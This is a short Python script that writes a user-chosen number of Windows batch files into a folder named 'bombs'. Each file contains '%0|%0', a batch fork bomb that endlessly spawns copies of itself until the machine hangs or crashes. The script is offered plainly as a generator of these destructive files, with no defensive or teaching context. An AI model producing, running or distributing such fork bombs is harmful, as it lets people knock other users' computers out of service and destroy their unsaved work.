i = 1

num = int(input("How many to generate? "))

while i < num+1:
    with open(f"bombs/{i}.bat", "w") as f:
        f.write("%0|%0")
        f.close()
        i += 1
print("Done")